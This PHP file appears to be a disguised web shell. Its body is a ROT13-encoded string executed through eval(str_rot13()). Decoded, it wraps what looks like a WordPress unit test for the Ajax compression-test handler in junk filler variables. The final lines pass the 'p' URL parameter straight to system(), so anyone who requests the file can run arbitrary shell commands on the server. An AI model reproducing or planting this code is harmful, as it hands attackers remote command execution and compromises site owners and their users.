<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk pbzcerffvba grfg shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.4.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_jc_pbzcerffvba_grfg
 */
pynff Grfgf_Nwnk_jcNwnkJcPbzcerffvbaGrfg rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Grfg nf n ybttrq bhg hfre
	 */
	choyvp shapgvba grfg_ybttrq_bhg() {
		$guvf->ybtbhg();

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['grfg'] = '1';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
	}

	/**
	 * Srgpu gur grfg grkg
	 */
	choyvp shapgvba grfg_grkg() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['grfg'] = '1';

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Rafher jr sbhaq gur evtug zngpu.
		$guvf->nffregFgevatPbagnvafFgevat( 'jcPbzcerffvbaGrfg', $guvf->_ynfg_erfcbafr );
	}

	/**
	 * Srgpu gur grfg grkg (tmqrsyngr)
	 *
	 * @erdhverf shapgvba tmqrsyngr
	 */
	choyvp shapgvba grfg_tmqrsyngr() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['grfg'] = '2';

		$_FREIRE['UGGC_NPPRCG_RAPBQVAT'] = 'qrsyngr';

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Rafher jr sbhaq gur evtug zngpu.
		$guvf->nffregFgevatPbagnvafFgevat( 'jcPbzcerffvbaGrfg', tmvasyngr( $guvf->_ynfg_erfcbafr ) );
	}

	/**
	 * Srgpu gur grfg grkg (tmrapbqr)
	 *
	 * @erdhverf shapgvba tmrapbqr
	 */
	choyvp shapgvba grfg_tmrapbqr() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['grfg'] = '2';

		$_FREIRE['UGGC_NPPRCG_RAPBQVAT'] = 'tmvc';

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Rafher jr sbhaq gur evtug zngpu.
		$guvf->nffregFgevatPbagnvafFgevat( 'jcPbzcerffvbaGrfg', $guvf->_tmqrpbqr( $guvf->_ynfg_erfcbafr ) );
	}

	/**
	 * Srgpu gur grfg grkg (haxabja rapbqvat)
	 */
	choyvp shapgvba grfg_haxabja_rapbqvat() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['grfg'] = '2';

		$_FREIRE['UGGC_NPPRCG_RAPBQVAT'] = 'haxabja';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
	}

	/**
	 * Frg gur 'pna_pbzcerff_fpevcgf' fvgr bcgvba gb gehr
	 */
	choyvp shapgvba grfg_frg_lrf() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['grfg'] = 'lrf';

		// Frg gur bcgvba gb snyfr.
		hcqngr_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf', 0 );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
		} pngpu ( JCNwnkQvrFgbcRkprcgvba $r ) {
			hafrg( $r );
		}

		// Purpx gur fvgr bcgvba vf abg punatrq qhr gb ynpx bs abapr.
		$guvf->nffregFnzr( 0, trg_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf' ) );

		// Nqq n abapr.
		$_TRG['_nwnk_abapr'] = jc_perngr_abapr( 'hcqngr_pna_pbzcerff_fpevcgf' );

		// Ergel gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
		} pngpu ( JCNwnkQvrFgbcRkprcgvba $r ) {
			hafrg( $r );
		}

		// Purpx gur fvgr bcgvba vf punatrq.
		$guvf->nffregFnzr( 1, trg_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf' ) );
	}

	/**
	 * Frg gur 'pna_pbzcerff_fpevcgf' fvgr bcgvba gb snyfr
	 */
	choyvp shapgvba grfg_frg_ab() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['grfg'] = 'ab';

		// Frg gur bcgvba gb gehr.
		hcqngr_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf', 1 );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
		} pngpu ( JCNwnkQvrFgbcRkprcgvba $r ) {
			hafrg( $r );
		}

		// Purpx gur fvgr bcgvba vf abg punatrq qhr gb ynpx bs abapr.
		$guvf->nffregFnzr( 1, trg_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf' ) );

		// Nqq n abapr.
		$_TRG['_nwnk_abapr'] = jc_perngr_abapr( 'hcqngr_pna_pbzcerff_fpevcgf' );

		// Ergel gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'jc-pbzcerffvba-grfg' );
		} pngpu ( JCNwnkQvrFgbcRkprcgvba $r ) {
			hafrg( $r );
		}

		// Purpx gur fvgr bcgvba vf punatrq.
		$guvf->nffregFnzr( 0, trg_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf' ) );
	}

	/**
	 * Haqb tmrapbqr.  Guvf vf htyl, ohg gurer'f ab fgbpx tmqrpbqr() shapgvba.
	 *
	 * @cnenz fgevat $rapbqrq_qngn
	 * @erghea fgevat
	 */
	cebgrpgrq shapgvba _tmqrpbqr( $rapbqrq_qngn ) {

		// Fnir gur rapbqrq qngn gb n grzc svyr.
		$svyr = jc_grzcanz( 'tmqrpbqr' );
		svyr_chg_pbagragf( $svyr, $rapbqrq_qngn );

		// Syhfu vg gb gur bhgchg ohssre naq qryrgr gur grzc svyr.
		bo_fgneg();
		ernqtmsvyr( $svyr );
		hayvax( $svyr );

		// Fnir gur qngn fgbc ohssrevat.
		$qngn = bo_trg_pyrna();

		// Qbar.
		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>